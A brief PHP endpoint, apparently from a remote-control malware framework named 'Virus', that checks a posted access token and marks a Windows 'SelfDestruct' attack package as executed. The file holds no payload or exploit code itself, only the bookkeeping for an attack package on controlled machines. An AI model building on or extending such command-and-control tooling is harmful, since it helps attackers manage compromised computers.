<?php

use Kelvinho\Virus\Singleton\Header;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\SelfDestruct\SelfDestruct $this */

if ($this->getAccessToken() !== $this->requestData->postCheck("access_token")) Header::forbidden();
$this->setExecuted();
